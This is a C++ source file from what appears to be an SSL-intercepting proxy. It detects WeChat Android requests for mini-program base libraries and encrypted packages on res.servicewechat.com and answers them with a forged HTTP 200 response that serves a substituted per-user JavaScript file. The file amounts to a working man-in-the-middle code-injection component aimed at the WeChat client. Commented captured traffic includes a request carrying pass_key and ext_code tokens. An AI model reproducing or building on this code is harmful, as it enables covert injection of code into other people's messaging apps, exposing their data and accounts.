
#include "weixinAndroidJS.h"
#include "PluginServer.h"

//res.servicewechat.com/weapp/public/commlib/327.patch-304
//res.servicewechat.com/weapp/public/commlib/327.wxapkg
//res.servicewechat.com/weapp/public/commlib/329.wxapkg


int gWeixinFlag = 0;

int WeixinAndroidJS::isWeixinAndroidJS(const char * url, const char * host) {
	if (strstr(host, "res.servicewechat.com") ) {
		if (strstr(url, "/weapp/public/commlib/"))
		{
			gWeixinFlag = 1;
			return TRUE;
		}else if (strstr(url,"/weapp/release_encrypt/"))
		{
			gWeixinFlag = 2;
			return TRUE;
		}
	}

	return FALSE;
}



int WeixinAndroidJS::makeWeixinAndroidJS(char * lpbuffer, int bufsize, int buflimit, LPSSLPROXYPARAM lpssl) {
	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
	string filename = Public::getUserUrl(lpssl->username, "weixinjs_new.js");

	//char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
	//string filename = Public::getUserUrl(lpssl->username, "weixinjs_new.zip");
	
	int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespFormat, 1);
	return ret;
}



/*
GET /weapp/public/commlib/327.patch-304 HTTP/1.1
Accept: *//*
Accept-Encoding: gzip
Cache-Control: no-cache
Connection: Keep-Alive
Content-Type: application/octet-stream
Host: res.servicewechat.com
User-Agent: MicroMessenger Client

HTTP/1.1 200 OK
Server: NWSs
Date: Mon, 09 Dec 2019 09:13:15 GMT
Content-Type: application/octet-stream
Content-Length: 296584
Connection: keep-alive
Cache-Control: max-age=2592000
Expires: Wed, 08 Jan 2020 09:13:14 GMT
Last-Modified: Mon, 09 Dec 2019 06:30:00 GMT
Content-Encoding: gzip
X-NWS-LOG-UUID: d8a83748-48f8-409e-8d1b-aded518dac3e
X-Cache-Lookup: Hit From Disktank3 Gz
*/

/*
GET /weapp/public/commlib/327.wxapkg HTTP/1.1
Accept: *//*
Accept-Encoding: gzip
Cache-Control: no-cache
Connection: Keep-Alive
Content-Type: application/octet-stream
Host: res.servicewechat.com
User-Agent: MicroMessenger Client

HTTP/1.1 200 OK
Server: NWSs
Date: Mon, 09 Dec 2019 09:51:23 GMT
Content-Type: application/octet-stream
Content-Length: 2107084
Connection: keep-alive
Cache-Control: max-age=2592000
Expires: Wed, 08 Jan 2020 09:51:22 GMT
Last-Modified: Sun, 08 Dec 2019 10:20:00 GMT
Content-Encoding: gzip
X-NWS-LOG-UUID: 3301d228-d54a-4ee5-922f-44efaa28a8f3
X-Cache-Lookup: Hit From Disktank3 Gz
*/



/*
GET /weapp/release_encrypt/28_YVhzoJY-RcK0en5yTknspnzYDo3GxHFuV9f_gQRz266jnF7T9xNythaNyhnwgYE6MoVGXUSeYikaIfvg.wxapkg?rand=595513653&pass_key=BS7pxsQUqhJ1KF9X668qEwTJ0mKwyWKFrUnzEBA17q0EYJnNQApU5eI3u4nc5ugb3NRAXrVLED0356lG3EPCvk-xjxTfYVtJtlrN9elv2GKVZJ4TXLL3uC2l2cjR3YDNGFyAE82BaTajVsAweU1X-HheN1_znVCKkKoSZpyt4z9OImvOg1QjEJK35TCuq9lmufdHMz2Wq99_Qf8qXEwYCiXf5SpQCjEL6tOdLQOhxDY~&ext_code=xiPM5gLJ8eizLii37VKEwxnOsLrDIMs7ONKCXu2FdZ0 HTTP/1.1
Accept: *//*
Accept-Encoding: gzip
Cache-Control: no-cache
Connection: Keep-Alive
Content-Type: application/octet-stream
Host: res.servicewechat.com
User-Agent: MicroMessenger Client

HTTP/1.1 200 OK
Server: NWSs
Date: Tue, 17 Dec 2019 05:59:52 GMT
Content-Type: application/octet-stream
Content-Length: 5141
Connection: keep-alive
Cache-Control: must-revalidate, max-age=2592000
Expires: Thu, 16 Jan 2020 05:59:51 GMT
Last-Modified: Tue, 17 Dec 2019 01:30:00 GMT
Content-Encoding: gzip
X-NWS-LOG-UUID: cad01bbf-fed4-41f0-bb81-ef45527326da
X-Cache-Lookup: Hit From Disktank3 Gz
*/